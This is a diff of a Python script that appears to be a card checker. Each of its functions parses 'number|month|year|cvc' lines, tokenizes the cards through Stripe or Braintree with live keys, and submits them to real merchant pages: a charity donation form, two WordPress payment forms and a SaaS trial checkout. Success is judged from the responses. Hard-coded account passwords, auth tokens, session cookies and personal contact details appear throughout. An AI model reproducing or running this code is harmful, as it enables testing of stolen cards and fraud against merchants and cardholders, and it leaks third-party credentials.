@@ -56,7 +56,7 @@ def Tele(ccx):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 	}
 
-	data = f'type=card&billing_details[name]=Vhhjj+nge&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=450dde21-df2a-4445-9015-6b4f1014ede65f3aac&payment_user_agent=stripe.js%2F89f50b7e22%3B+stripe-js-v3%2F89f50b7e22%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=51460&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
+	data = f'type=card&billing_details[name]=Vhhjj+nge&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fb2d52e5892%3B+stripe-js-v3%2Fb2d52e5892%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=75926&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
 	pm = r1.json()['id']
@@ -66,9 +66,8 @@ def Tele(ccx):
             '_ga': 'GA1.1.1027315439.1730043864',
             '__stripe_mid': '7d5426db-2192-4323-9eeb-146aa8676b4d905708',
             'charitable_session': '70109c66237872fdeb294b680424a071||86400||82800',
-            '_ga_M3WG7TPY0P': 'GS1.1.1730432773.11.1.1730432781.0.0.0',
-            '__stripe_sid': '450dde21-df2a-4445-9015-6b4f1014ede65f3aac',
-            '_ga_9S894YGECP': 'GS1.1.1730432772.11.1.1730432806.0.0.0',
+            '_ga_M3WG7TPY0P': 'GS1.1.1730529136.13.1.1730529301.0.0.0',
+            '_ga_9S894YGECP': 'GS1.1.1730529136.13.1.1730529352.0.0.0',
 	}
 
 	headers = {
@@ -76,7 +75,7 @@ def Tele(ccx):
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': '_ga=GA1.1.1027315439.1730043864; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; charitable_session=70109c66237872fdeb294b680424a071||86400||82800; _ga_M3WG7TPY0P=GS1.1.1730432773.11.1.1730432781.0.0.0; __stripe_sid=450dde21-df2a-4445-9015-6b4f1014ede65f3aac; _ga_9S894YGECP=GS1.1.1730432772.11.1.1730432806.0.0.0',
+            # 'cookie': '_ga=GA1.1.1027315439.1730043864; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; charitable_session=70109c66237872fdeb294b680424a071||86400||82800; _ga_M3WG7TPY0P=GS1.1.1730529136.13.1.1730529301.0.0.0; _ga_9S894YGECP=GS1.1.1730529136.13.1.1730529352.0.0.0',
             'origin': 'https://needhelped.com',
             'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
@@ -91,9 +90,9 @@ def Tele(ccx):
 
 
 	data = {
-            'charitable_form_id': '67244f0bd214c',
-            '67244f0bd214c': '',
-            '_charitable_donation_nonce': 'b68114877f',
+            'charitable_form_id': '6725c777e5d48',
+            '6725c777e5d48': '',
+            '_charitable_donation_nonce': '82b4bc4e8c',
             '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
             'campaign_id': '1164',
             'description': 'Poor Children Donation Support',
@@ -128,6 +127,8 @@ def Tele(ccx):
 		return 'success' or 'Thank You'
 	return ii
 	
+
+	
 	
 	
 	
@@ -137,7 +138,7 @@ def Tele(ccx):
 	
 	
 import requests,re
-def Tele2(ccx):
+def Tele1(ccx):
 	import requests
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
@@ -147,42 +148,45 @@ def Tele2(ccx):
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
 	r = requests.session()
-	
+
+
 	headers = {
-			'authority': 'api.stripe.com',
-			'accept': 'application/json',
-			'accept-language': 'en-US,en;q=0.9',
-			'content-type': 'application/x-www-form-urlencoded',
-			'origin': 'https://js.stripe.com',
-			'referer': 'https://js.stripe.com/',
-			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-			'sec-ch-ua-mobile': '?1',
-			'sec-ch-ua-platform': '"Android"',
-			'sec-fetch-dest': 'empty',
-			'sec-fetch-mode': 'cors',
-			'sec-fetch-site': 'same-site',
-			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 	}
 
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51Q9zOoP8CnXsumqaMSligBEuHCOTbbw06EdZ8p0Yvr64Pgi7jDwI8IzHSZZWrsj0atvhQfrCDFuYWslVhgqJWSyH006EBFpwtZ'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=533bf720-b3ae-4db5-b780-a21794a9169e55cce1&sid=3e3d1806-ebef-4d90-a732-e1af46a6dab0ba3df3&payment_user_agent=stripe.js%2F647211f3a5%3B+stripe-js-v3%2F647211f3a5%3B+card-element&referrer=https%3A%2F%2Fkittyhawk.academy&time_on_page=133459&key=pk_live_51Q8kzIRtkDkj1jFU7kJCU9ICe12NnYFvukCggtwOMxOVdXOowy84cRiPF9KIUb7bUozCSm4L5j9Bd0nM2XURgT4u00rle6aYVl'
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
 	pm = r1.json()['id']
 
 
 	cookies = {
-            '__stripe_mid': '3d85359e-8d75-414e-9b44-1b5c4412a86152dadf',
-            '__stripe_sid': 'e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
+            '_ga_MGS3WFSV98': 'GS1.1.1730315870.1.0.1730315870.0.0.0',
+            '_ga': 'GA1.1.1309974513.1730315870',
+            '__stripe_mid': '533bf720-b3ae-4db5-b780-a21794a9169e55cce1',
+            '__stripe_sid': '3e3d1806-ebef-4d90-a732-e1af46a6dab0ba3df3',
 	}
 
 	headers = {
-            'authority': 'g-pg.com.au',
+            'authority': 'kittyhawk.academy',
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': '__stripe_mid=3d85359e-8d75-414e-9b44-1b5c4412a86152dadf; __stripe_sid=e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
-            'origin': 'https://g-pg.com.au',
-            'referer': 'https://g-pg.com.au/welcome/repeat-script-requests',
+            # 'cookie': '_ga_MGS3WFSV98=GS1.1.1730315870.1.0.1730315870.0.0.0; _ga=GA1.1.1309974513.1730315870; __stripe_mid=533bf720-b3ae-4db5-b780-a21794a9169e55cce1; __stripe_sid=3e3d1806-ebef-4d90-a732-e1af46a6dab0ba3df3',
+            'origin': 'https://kittyhawk.academy',
+            'referer': 'https://kittyhawk.academy/membership/',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -194,17 +198,17 @@ def Tele2(ccx):
 	}
 
 	params = {
-			't': '1729922956202',
+			't': '1730316010174',
 	}
 
 	data = {
-            'data': '__fluent_form_embded_post_id=1138&_fluentform_5_fluentformnonce=a397b837fc&_wp_http_referer=%2Fwelcome%2Frepeat-script-requests&names%5Bfirst_name%5D=Chit&names%5Blast_name%5D=Nge&datetime=21%2F10%2F2000&names_1%5Bfirst_name%5D=Chit&names_1%5Blast_name%5D=Nge&input_text=Tgg&address_1%5Baddress_line_1%5D=New%20York&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&numeric-field=1502565942&email=saimyataungcr8%40gmail.com&dropdown=Dr%20Jo%20Centra&message=Cc&datetime_2=03%2F10%2F2024&message_1=Cc&datetime_1=31%2F10%2F2024&payment_input=Standard%20Script%20Request&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+            'data': '__fluent_form_embded_post_id=32&_fluentform_4_fluentformnonce=d94a295060&_wp_http_referer=%2Fmembership%2F&names%5Bfirst_name%5D=Chit&names%5Blast_name%5D=Nge&phone=%2B12015858673&email=saimyataungcr8%40gmail.com&address_1%5Baddress_line_1%5D=New%20York&address_1%5Baddress_line_2%5D=Gg&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&input_text=Tgg&datetime_1=26-Oct-24&input_text_1=&datetime_2=&input_text_2=&checkbox_4%5B%5D=MEP&datetime_4=&names_1%5Bfirst_name%5D=Chit&names_1%5Blast_name%5D=Nge&email_1=saimyataungcr8%40gmail.com&phone_1=%2B12018686856&payment_input_1=1&payment_method=stripe&__entry_intermediate_hash=a4846220a0d80f52e8711cc09e6dba8a&checkbox_2%5B%5D=&checkbox_5%5B%5D=&checkbox_6%5B%5D=&checkbox_9%5B%5D=&checkbox_7%5B%5D=&checkbox_8%5B%5D=&checkbox_10%5B%5D=&checkbox_1%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
             'action': 'fluentform_submit',
-            'form_id': '5',
+    'form_id': '4',
 	}
 	
 	r2 = requests.post(
-			'https://g-pg.com.au/wp-admin/admin-ajax.php',
+			'https://kittyhawk.academy/wp-admin/admin-ajax.php',
 			params=params,
 			cookies=cookies,
 			headers=headers,
@@ -215,10 +219,14 @@ def Tele2(ccx):
 	except:
 		return 'success' or 'Your card does not support this type of purchase'
 	return ii
+	
+	
+	
+
 
 
 import requests,re
-def Tele3(ccx):
+def Tele2(ccx):
 	import requests
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
@@ -305,7 +313,7 @@ def Tele3(ccx):
 
 
 import requests,re
-def Tele4(ccx):
+def Tele3(ccx):
 	import requests
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
@@ -395,7 +403,7 @@ def Tele4(ccx):
 	return ii
 	
 import requests,re
-def Tele6(ccx):
+def Tele4(ccx):
 	import requests
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
@@ -479,4 +487,198 @@ def Tele6(ccx):
 		return 'success' or 'Thank you'
 	return ii
 	
+import requests
+import re
+import random
+import time
+import string
+import base64
+from user_agent import generate_user_agent
+from bs4 import BeautifulSoup
+def Tele5(ccx):
+	import requests
+	ccx=ccx.strip()
+	n = ccx.split("|")[0]
+	mm = ccx.split("|")[1]
+	yy = ccx.split("|")[2]
+	cvc = ccx.split("|")[3]
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]
+	r = requests.session()
+	with open('fileb3.txt', 'r') as file:
+		first_line = file.readline()
+	while True:
+		lines='''zkbzmssh%7C1722163826%7CPYyJVGful9oiz9Fk2qffCmmrLkPFHj6pjCToHoyt8r1%7Ceb9935d8bc113a5acd9c193064033918787622ca95782d6317955699be2082b0
+'hdjshshsh%7C1722164162%7CTP3afdym0X81iDDxRTbRkBWLDdAKgqEKwqx6GYim365%7C424cfcf6eb45d32f11893eb98004603b447a77cee129c990e95867665537d75d
+bsbsjdhhdj%7C1722164292%7CAnd5Gmo2UVNQz7IFiuuOHbcWFUoVJBk7DQtsjQS27Oa%7C6e9883df5374751c0cdc9383a751fcb80b31dfacc9e4747bbf08883e4986a7c7
+jdhshsh%7C1722164426%7CQkqnUBtPMRYcYpcvKhriZedlcVJsl24RrNRohG9rVRM%7Cbb8a8b162fd95263262ae98ada998ab6063eb46e075d944fda37cffee93b343a
+'''
+		lines = lines.strip().split('\n')
+		random_line_number = random.randint(0, len(lines) - 1)
+		big = lines[random_line_number]
+		if big == first_line:
+			pass
+		else:
+			break
+	with open('fileb3.txt', 'w') as file:
+		file.write(big)
+	cookies = {
+        'prism_799560831': '456b96fa-aad6-4b72-bf00-1ed400a05b67',
+        '_hjSessionUser_1370678': 'eyJpZCI6ImYxYzNkZmUzLTkyYmYtNWJmOS04ODgyLTUxYzUwMGIzZWU4NiIsImNyZWF0ZWQiOjE3Mjk1MjgyNjAyODMsImV4aXN0aW5nIjp0cnVlfQ==',
+        '_fbp': 'fb.1.1729528503090.441381019795189341',
+        '_gid': 'GA1.2.1462020079.1730483498',
+        '_hjSession_1370678': 'eyJpZCI6IjM0MjRiMTM3LTViZDMtNDNmYi04MGU3LTI3ZjI4MmQyMzY2ZiIsImMiOjE3MzA0ODM0OTk0OTYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
+        'newUser': 'j%3A%2267253fc76a88b34aed93beb1%22',
+        '_hjHasCachedUserAttributes': 'true',
+        '_ga': 'GA1.2.650073427.1729528251',
+        '_gat_UA-124464104-1': '1',
+        '_gat_UA-182261587-1': '1',
+        '_ga_EJ0BHS4FHZ': 'GS1.1.1730483497.6.1.1730496294.54.0.393490397',
+        'TawkConnectionTime': '0',
+        'twk_uuid_5bb54fe6b033e9743d022de5': '%7B%22uuid%22%3A%221.SwuzFR4gjGkWunf2HDh5d7d2IXulKcGJhDN7JNMsLjWLAu8Mfv363VDebfh7HXMxwP2H1Nxqd5VQHCLWysZCWux2LATUyOP9vnbcuhmFOOfH9Cv4BCFHo%22%2C%22version%22%3A3%2C%22domain%22%3A%22flowster.app%22%2C%22ts%22%3A1730496297292%7D',
+	}
+	
+	headers = {
+        'authority': 'in.flowster.app',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/json',
+        # 'cookie': '_gcl_au=1.1.1950500355.1729528251; prism_799560831=456b96fa-aad6-4b72-bf00-1ed400a05b67; _hjSessionUser_1370678=eyJpZCI6ImYxYzNkZmUzLTkyYmYtNWJmOS04ODgyLTUxYzUwMGIzZWU4NiIsImNyZWF0ZWQiOjE3Mjk1MjgyNjAyODMsImV4aXN0aW5nIjp0cnVlfQ==; _fbp=fb.1.1729528503090.441381019795189341; _gid=GA1.2.1462020079.1730483498; _hjSession_1370678=eyJpZCI6IjM0MjRiMTM3LTViZDMtNDNmYi04MGU3LTI3ZjI4MmQyMzY2ZiIsImMiOjE3MzA0ODM0OTk0OTYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; newUser=j%3A%2267253fc76a88b34aed93beb1%22; _hjHasCachedUserAttributes=true; _ga=GA1.2.650073427.1729528251; _gat_UA-124464104-1=1; _gat_UA-182261587-1=1; _ga_EJ0BHS4FHZ=GS1.1.1730483497.6.1.1730496294.54.0.393490397; TawkConnectionTime=0; twk_uuid_5bb54fe6b033e9743d022de5=%7B%22uuid%22%3A%221.SwuzFR4gjGkWunf2HDh5d7d2IXulKcGJhDN7JNMsLjWLAu8Mfv363VDebfh7HXMxwP2H1Nxqd5VQHCLWysZCWux2LATUyOP9vnbcuhmFOOfH9Cv4BCFHo%22%2C%22version%22%3A3%2C%22domain%22%3A%22flowster.app%22%2C%22ts%22%3A1730496297292%7D',
+        'origin': 'https://in.flowster.app',
+        'referer': 'https://in.flowster.app/',
+        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        'x-auth': 'null',
+	}
+	
+	json_data = {
+        'email': 'minhtetxx@gmail.com',
+        'password': 'Chitnge834@',
+	}
+	response = requests.post('https://in.flowster.app/api/login', cookies=cookies, headers=headers, json=json_data)	
+    
+    
+	headers = {
+        'authority': 'payments.braintree-api.com',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9',
+        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzA1ODI3NTQsImp0aSI6Ijk5YzQ0YTk5LTM5MTUtNDk2Ni1iYTczLTFjZjg5NmM1ZmU3ZSIsInN1YiI6IjdrOG1zdHJnN3BmeHA1ZjgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjdrOG1zdHJnN3BmeHA1ZjgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJjdXN0b21lcl9pZCI6IjU3MDk1NzU0MDk5In19.pBboGTE8q_G3qe4VccCcrLmI8nxZYOxy03YZl7-aaup3Ldi8qMueDLlAtTP1W0p5ZOqBbQbBrRvgOI7MwwQsjA?customer_id=',
+        'braintree-version': '2018-05-10',
+        'content-type': 'application/json',
+        'origin': 'https://assets.braintreegateway.com',
+        'referer': 'https://assets.braintreegateway.com/',
+        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'cross-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    }
+	
+	
+	json_data = {
+        'clientSdkMetadata': {
+            'source': 'client',
+            'integration': 'dropin2',
+            'sessionId': 'a1cea4e3-a274-4cdf-a9bd-54e60c2d7060',
+        },
+        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+        'variables': {
+            'input': {
+                'creditCard': {
+                    'number': n,
+                    'expirationMonth': mm,
+                    'expirationYear': yy,
+                    'cvv': cvc,
+                    'billingAddress': {
+                        'postalCode': '10080',
+                    },
+                },
+                'options': {
+                    'validate': False,
+                },
+            },
+        },
+        'operationName': 'TokenizeCreditCard',
+	}
+	
+	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+	tok = response.json()['data']['tokenizeCreditCard']['token']
+	
+	# Note: json_data will not be serialized by requests
+	# exactly as it was in the original request.
+	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"698e6aaa-6b50-4bf0-adc4-d454c57ef68a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4304512200105020","expirationMonth":"10","expirationYear":"2028","cvv":"323","billingAddress":{"postalCode":"11743","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
+	import requests
+	
+	cookies = {
+        '_gcl_au': '1.1.1950500355.1729528251',
+        'prism_799560831': '456b96fa-aad6-4b72-bf00-1ed400a05b67',
+        '_hjSessionUser_1370678': 'eyJpZCI6ImYxYzNkZmUzLTkyYmYtNWJmOS04ODgyLTUxYzUwMGIzZWU4NiIsImNyZWF0ZWQiOjE3Mjk1MjgyNjAyODMsImV4aXN0aW5nIjp0cnVlfQ==',
+        '_fbp': 'fb.1.1729528503090.441381019795189341',
+        '_gid': 'GA1.2.1462020079.1730483498',
+        '_hjSession_1370678': 'eyJpZCI6IjM0MjRiMTM3LTViZDMtNDNmYi04MGU3LTI3ZjI4MmQyMzY2ZiIsImMiOjE3MzA0ODM0OTk0OTYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
+        'newUser': 'j%3A%2267253fc76a88b34aed93beb1%22',
+        '_ga': 'GA1.2.650073427.1729528251',
+        'TawkConnectionTime': '0',
+        'twk_uuid_5bb54fe6b033e9743d022de5': '%7B%22uuid%22%3A%221.SwuzFR4gjGkWunf2HDh5d7d2IXulKcGJhDN7JNMsLjWLAu8Mfv363VDebfh7HXMxwP2H1Nxqd5VQHCLWysZCWux2LATUyOP9vnbcuhmFOOfH9Cv4BCFHo%22%2C%22version%22%3A3%2C%22domain%22%3A%22flowster.app%22%2C%22ts%22%3A1730496330142%7D',
+        '_hjHasCachedUserAttributes': 'true',
+        '_ga_EJ0BHS4FHZ': 'GS1.1.1730483497.6.1.1730496332.16.0.393490397',
+	}
+	
+	headers = {
+        'authority': 'in.flowster.app',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/json',
+        # 'cookie': '_gcl_au=1.1.1950500355.1729528251; prism_799560831=456b96fa-aad6-4b72-bf00-1ed400a05b67; _hjSessionUser_1370678=eyJpZCI6ImYxYzNkZmUzLTkyYmYtNWJmOS04ODgyLTUxYzUwMGIzZWU4NiIsImNyZWF0ZWQiOjE3Mjk1MjgyNjAyODMsImV4aXN0aW5nIjp0cnVlfQ==; _fbp=fb.1.1729528503090.441381019795189341; _gid=GA1.2.1462020079.1730483498; _hjSession_1370678=eyJpZCI6IjM0MjRiMTM3LTViZDMtNDNmYi04MGU3LTI3ZjI4MmQyMzY2ZiIsImMiOjE3MzA0ODM0OTk0OTYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; newUser=j%3A%2267253fc76a88b34aed93beb1%22; _ga=GA1.2.650073427.1729528251; TawkConnectionTime=0; twk_uuid_5bb54fe6b033e9743d022de5=%7B%22uuid%22%3A%221.SwuzFR4gjGkWunf2HDh5d7d2IXulKcGJhDN7JNMsLjWLAu8Mfv363VDebfh7HXMxwP2H1Nxqd5VQHCLWysZCWux2LATUyOP9vnbcuhmFOOfH9Cv4BCFHo%22%2C%22version%22%3A3%2C%22domain%22%3A%22flowster.app%22%2C%22ts%22%3A1730496330142%7D; _hjHasCachedUserAttributes=true; _ga_EJ0BHS4FHZ=GS1.1.1730483497.6.1.1730496332.16.0.393490397',
+        'origin': 'https://in.flowster.app',
+        'referer': 'https://in.flowster.app/',
+        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        'x-auth': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NzI1M2MwNTEzNmI3NGNlYWQ4MzVhOWQiLCJhY2Nlc3MiOiJhdXRoIiwiZGF0ZSI6MTczMDQ5NjMyNzg2MCwiaWF0IjoxNzMwNDk2MzI3fQ.d618FA3sUypw_-7IbFxYV2VnMt95qX7u2BKZLznIHL4',
+    }	
+	
+	json_data = {
+        'customer_ip': '129.153.8.93',
+        'paymentMethodNonce': tok,
+        'deviceData': '{"correlation_id":"7d4a4ac5633e6f2561650dba646a5eb5"}',
+        'divisionId': '67253c146a88b34aed93b6a4',
+        'plan': 'Startup',
+        'planType': 'year',
+        'signup': False,
+        'PPTId': '62be2614f01143674e6e0d33',
+        'trial': {
+            'PPTId': '62be2614f01143674e6e0d33',
+            'trialPeriod': True,
+            'trialDuration': 7,
+            'trialDurationUnit': 'day',
+            'nextBillingDate': None,
+            'paymentMethodRequired': True,
+        },
+        'browserId': '5903b0ed-3989-4db0-ac92-a34731058267',
+	}
+	
+
+      	
+	
+	response = requests.post(
+	    'https://in.flowster.app/payment/division/checkout',
+	    cookies=cookies,
+	    headers=headers,
+	    json=json_data,
+	)
+	return (response.json())
+
 	
